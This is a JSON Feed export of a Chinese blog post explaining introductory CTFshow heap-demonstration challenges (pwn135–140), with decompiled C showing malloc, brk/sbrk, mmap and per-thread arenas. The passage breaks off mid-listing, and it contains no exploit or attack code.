{
    "version": "https://jsonfeed.org/version/1",
    "title": "0110 0011 0111 1001 0110 0010 • All posts by \"ctfshow\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow135-145/",
            "url": "https://vvwwvv.cn/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow135-145/",
            "title": "CTFshow(堆利用-前置基础,135~)",
            "date_published": "2023-10-26T03:01:15.000Z",
            "content_html": "<p>为防止题目难度跨度太大，135-140 为演示题目阶段</p>\n<h1 id=\"pwn135\"><a class=\"anchor\" href=\"#pwn135\">#</a> pwn135</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p>题目描述： <code>如何申请堆？</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<p>演示了 <code>malloc</code> 、 <code>calloc</code> 、 <code>realloc</code>  函数</p>\n<p>区别：</p>\n<ul>\n<li>函数 malloc 不能初始化所分配的内存空间，而函数 calloc 能</li>\n<li>函数 calloc () 会将所分配的内存空间中的每一位都初始化为零</li>\n<li>realloc 可以对给定的指针所指的空间进行扩大或者缩小，无论是扩张或是缩小，原有内存的中内容将保持不变</li>\n</ul>\n<p>【直接输入 4 就可以获得 flag】</p>\n<h1 id=\"pwn136brk与sbrk\"><a class=\"anchor\" href=\"#pwn136brk与sbrk\">#</a> pwn136 (brk 与 sbrk)</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p>题目描述： <code>如何释放堆？</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<p>这里是对 <code>malloc</code> 、 <code>calloc</code> 、 <code>realloc</code>  申请的空间进行释放</p>\n<h1 id=\"pwn137\"><a class=\"anchor\" href=\"#pwn137\">#</a> pwn137</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p>题目描述： <code>sbrk and brk example</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">sbrk_brk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>addr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v0 <span class=\"token operator\">=</span> <span class=\"token function\">getpid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sbrk example:%d\\n\"</span><span class=\"token punctuation\">,</span> v0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  addr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">sbrk</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Program Break Location1:%p\\n\"</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">brk</span><span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">sbrk</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Program Break Location2:%p\\n\"</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">brk</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">sbrk</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Program Break Location3:%p\\n\"</span><span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里是利用 brk 和 sbrk 来实现内存分配</p>\n<p>brk (addr) 函数直接修改有效访问范围的 <code>末尾地址</code> 实现分配与回收（返回 0 或 - 1）</p>\n<p>sbrk () 参数函数中：当 increment 为正值时，间断点位置向后移动 increment 字节。同时返回移动之前的位置，相当于分配内存。当 increment 为负值时，位置向前移动 increment 字节，相当与于释放内存 (返回修改间断点前的地址)</p>\n<p>所以这里一开始 <code>addr = (char *)sbrk(0LL);</code>  为间断点起始地址；</p>\n<p><code>brk(addr + 4096);</code>  间断点地址开始 + 4096；</p>\n<p><code> brk(addr);</code>  将间断点设置回原来 <code>addr</code>  处</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%29%25%60WD%7DIG6WE%24W8FNA63UCER.png\" alt=\"\" /></p>\n<h1 id=\"pwn138mmap-内存映射\"><a class=\"anchor\" href=\"#pwn138mmap-内存映射\">#</a> pwn138 (mmap 内存映射)</h1>\n<p>内存映射在多进程访问文件读写的时候非常方便</p>\n<p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用</p>\n<p>【必看：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTQ0Mjc4P3NoYXJlQnlDaGFubmVsPWxpbmsjY29udGVudCVFMyU4MCU5MQ==\">https://cloud.tencent.com/developer/article/1944278?shareByChannel=link#content】</span></p>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p>题目描述： <code>Private anonymous mapping exampl</code></p>\n<p>64 位程序，保护全开</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>addr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">getpid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to private anonymous mapping example::PID:%d\\n\"</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Before mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  addr <span class=\"token operator\">=</span> <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21000uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> addr <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1LL</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">errExit</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After mmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">munmap</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x21000uLL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">errExit</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"munmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After munmap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>建立一个私人匿名映射区域，利用 munmap 来销毁这个区域</p>\n<h1 id=\"pwn139-多线程支持\"><a class=\"anchor\" href=\"#pwn139-多线程支持\">#</a> pwn139 (多线程支持)</h1>\n<p><code>glibc的ptmalloc支持多线程</code> ，一个线程申请的 1 个或多个堆包含很多的信息，Arena 就是来管理线程中的这些堆的，也可以理解为堆管理器所持有的内存池</p>\n<p>一个线程只有一个 arnea，并且这些线程的 arnea 都是独立的不是相同的</p>\n<p>主线程的 arnea 称为 “main_arena”。子线程的 arnea 称为 “thread_arena”</p>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p>题目描述： <code>多线程支持</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">flag_demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-20h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __int64 size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  stream <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/ctfshow_flag\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> stream <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">fseek</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    size <span class=\"token operator\">=</span> <span class=\"token function\">ftell</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">fseek</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Allocate heap memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> ptr <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Read ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token number\">1uLL</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> stream<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> size <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here is your flag:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> size<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>          <span class=\"token function\">putchar</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"free\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to read file\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Memory allocation failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to open file\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"pwn140利用pthread_create函数创建多线程\"><a class=\"anchor\" href=\"#pwn140利用pthread_create函数创建多线程\">#</a> pwn140（利用 <code>pthread_create函数</code> 创建多线程）</h1>\n<p>pthread_create () 函数用来创建线程，pthread_join () 函数用来接收线程执行函数的返回值</p>\n<h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目</h2>\n<p>题目描述: <code>多线程支持</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token class-name\">pthread_t</span> newthread<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>thread_return<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">getpid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to per thread arena example::%d\\n\"</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Before malloc in main thread\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  ptr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After malloc and before free in main thread\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 